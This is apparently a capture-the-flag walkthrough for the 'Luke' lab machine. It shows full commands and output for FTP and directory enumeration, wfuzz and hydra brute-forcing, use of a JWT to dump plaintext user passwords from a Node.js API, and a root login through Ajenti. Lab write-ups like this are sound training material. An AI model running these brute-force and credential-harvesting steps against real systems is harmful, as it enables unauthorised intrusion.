# Solution

We start by running an nmap enumeration
```
> nmap -sV -sC -on nmap-initial-full 10.10.10.137

21/tcp   open  ftp     vsftpd 3.0.3+ (ext.1)
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 0        0             512 Apr 14  2019 webapp
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.10.14.25
|      Logged in as ftp
|      TYPE: ASCII
|      No session upload bandwidth limit
|      No session download bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3+ (ext.1) - secure, fast, stable
|_End of status
22/tcp   open  ssh?
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
80/tcp   open  http    Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.38 (FreeBSD) PHP/7.3.3
|_http-title: Luke
3000/tcp open  http    Node.js Express framework
|_http-title: Site doesn't have a title (application/json; charset=utf-8).
8000/tcp open  http    Ajenti http control panel
|_http-title: Ajenti

```

We have FTP open with anonymous login. So, we can login as anonymous and random password. Inside the /webapp folder we find a txt file with the following content:
```
Dear Chihiro !!

As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of 
the actual website I've created .
Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! 
```

Let's look for the source code then. 

We run gobuster 
```
>gobuster dir -u http://10.10.10.137/ -w /usr/share/wordlists/dirbuster/di rectory-list-2.3-medium.txt -o gobuster.out -t 30 -x html,php

/index.html (Status: 200)
/login.php (Status: 200)
/member (Status: 301)
/management (Status: 401)
/css (Status: 301)
/js (Status: 301)
/vendor (Status: 301)
/config.php (Status: 200)
/LICENSE (Status: 200)
```
We browse them and we found a couple of login and admin pages. We could try to bruteforce them using the 2 names we already have but we decided to look around a bit more  

In /config.php we find the login credentials to mysqli
```
$dbHost = 'localhost';
$dbUsername = 'root';
$dbPassword  = 'Zk6heYCyv6ZE9Xcg';
$db = "login";

$conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die("Connect failed: %s\n". $conn -> error);
```

We try the password in the different logins but no lack. In order to automate the user/passwords guessing we create a file with all the potential usernames. We load the file in burp intruder and fuzz the username associated with the password we have.  

We tried to login in /login.php, /management, Ajenti in port 8000, ssh. No luck so far !  

A node js app is listening on port 3000. It requires an authentication to serve the responses. We can try to play around with this service and hope the credentials we have are the ones needed here.

We run a directory/file bruteforce 
```
gobuster dir -u http://10.10.10.137:3000/ -w /usr/share/wordlists/dirbust er/directory-list-2.3-medium.txt -o gobuster:3000.out -t 30 -x php,json,js,txt
/login (Status: 200)
/users (Status: 200)
/Login (Status: 200)
/Users (Status: 200)
```

Let's do some google searches and study how the authentication may work.  

It may be possible that we get the auth token upon authentication with the credentials we have.  
Then we could pass the auth token in the request to the json node application and get the response.

Let's try in practise.  
By browsing 10.10.10.137:3000/login we are not required to provide an auth token. This is the page where we can authenticate through username and password and get an auth token. The default json variable names used by node application for authentication are "username" and "password". We can craft our request
```
> curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"root"}' http://10.10.10.137:3000/login
forbidden
```
The authentication is not succesfull. However the error description suggest that the supplied credentials are not correct. Burpsuite or Wfuzz is again handy here for fuzzing the username with the list of potential username we have.

```
>wfuzz -z file,people -H "Content-Type: application/json" -d '{"password":"Zk6heYCyv6ZE9Xcg", "username":"FUZZ"}'  http://10.10.10.137:3000/login


===================================================================
ID           Response   Lines    Word     Chars       Payload                                          
===================================================================

000000001:   403        0 L      1 W      9 Ch        "Luke"                                           
000000008:   200        0 L      2 W      219 Ch      "admin"                                          
000000006:   403        0 L      1 W      9 Ch        "chihiro"                                        
000000010:   403        0 L      1 W      9 Ch        "luke.io"                                        
000000004:   403        0 L      1 W      9 Ch        "derry"                                          
000000007:   403        0 L      1 W      9 Ch        "root"                                           
000000011:   403        0 L      1 W      9 Ch        "contact@luke.io"                                
000000005:   403        0 L      1 W      9 Ch        "Chihiro"                                        
000000003:   403        0 L      1 W      9 Ch        "Derry"                                          
000000009:   403        0 L      1 W      9 Ch        "Luke.io"                                        
000000002:   403        0 L      1 W      9 Ch        "luke"      
```

The admin username produced a different response (219 characters and not the usual 9 char "forbidden" ).  
By looking at the json response we have our auth token:
```
> > curl --header "Content-Type: application/json" --request POST --data '{"password":"Zk6heYCyv6ZE9Xcg", "username":"admin"}' http://10.10.10.137:3000/login

{"success":true,"message":"Authentication successful!","token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjExNzQ4MTU3LCJleHAiOjE2MTE4MzQ1NTd9.Eb7CeW0Fm0nULxLA_IaHAXWTfRt2EtSYFmIRTjSLLHU"}
```

The auth token can now be passed in the header to have access to the resources we want. The token has to be passed in the Authorization header.  
```
>curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjExNzQ5OTUxLCJleHAiOjE2MTE4MzYzNTF9.htR21iH9laL4uWjfiunYcn1xGkHhIn-CP8A1VgADyrc' http://10.10.10.137:3000

{"message":"Welcome admin ! "}
```
Now we know that out auth token works. We can use it to visit the /users tab
```
> curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjExNzQ5OTUxLCJleHAiOjE2MTE4MzYzNTF9.htR21iH9laL4uWjfiunYcn1xGkHhIn-CP8A1VgADyrc' http://10.10.10.137:3000/users


[{"ID":"1","name":"Admin","Role":"Superuser"},{"ID":"2","name":"Derry","Role":"Web Admin"},{"ID":"3","name":"Yuri","Role":"Beta Tester"},{"ID":"4","name":"Dory","Role":"Supporter"}]
```

Now we have a bunch of new username that we can try in the logins. However it does not seem to work.  
We run hydra on login.php with username Yuri/yuri (the /login.php is the login for the beta version. Yuri is the beta tester as we discovered some moments before.  
```
hydra -L beta_tester -P /usr/share/wordlists/rockyou.txt -v 10.10.10.137 http-post-form '/login.php:Username=^USER^&Password=^PASS^&Submit=Login:Incorrect'
```

We haven't run nikto yet, know it is the moment since it may give us an inspiration on the next step.  
Nikto returns an interesting information
```
+ /package.json: Node.js package file found. It may contain sensitive information
```
So let's take a look at this json.  
We find the reference to the github page of the web page. We visit it and analyse the code. Nothing that can be exploited.  

At this point there are not much more possibilities left, thus we restart enumerating.  
We run a recursive directory/file search with dirbuster and we get some new veeeery interesting files
```
File found: /login - 200
File found: /Login - 200
Dir found: /login/ - 200
Dir found: /Login/ - 200
Dir found: /users/ - 200
File found: /users - 200
Dir found: /users/admin/ - 200
Dir found: /users/Admin/ - 200
Dir found: /users/ADMIN/ - 200
File found: /users/admin - 200
File found: /users/Admin - 200
File found: /users/ADMIN - 200
```

It is time to play with those juicy admin pages.  
We already have the auth token. Then
```
>> curl -X GET -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNjExNzQ5OTUxLCJleHAiOjE2MTE4MzYzNTF9.htR21iH9laL4uWjfiunYcn1xGkHhIn-CP8A1VgADyrc' http://10.10.10.137:3000/users/admin
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}
```

Again, we can try the password on the login forms we have. We try all possible user/password combinations.  
:(   , still no access to any portal.  
What are we missing?

After a while and some unfruitful brute forces, we keep looking at the json application on port 3000.  
Since we got the admin password under the /users/admin, We tried to look in /users/yuri folder to get yuri's credentials. It works, so as for the other users. Dirbuster hasn't detected the folder because the dictonary file we supplied did not contain those names. This are the pages we are looking for:
```
File found: /users/Derry - 200
File found: /users/Yuri - 200
File found: /users/Dory - 200
File found: /users/dory - 200
File found: /users/admin - 200
File found: /users/derry - 200
File found: /users/yuri - 200
File found: /users/Admin - 200
```

Thus we get:
```
{"name":"Yuri","password":"bet@tester87"}
{"name":"Derry","password":"rZ86wwLvx7jUxtch"}
{"name":"Dory","password":"5y:!xa=ybfe)/QD"}
{"name":"Admin","password":"WX5b7)>/rp$U)FW"}    (the same as before  )
```

With Derry/rZ86wwLvx7jUxtch we can enter in the /management folder on port 80. Inside we find a config.json file containing the root passsword for the Ajenti portal on port 3000 (root/KpMasng6S5EtTy9Z).  
Once inside the portal we can spawn a root terminal in the "terminal" tab and retrieve the flag files.






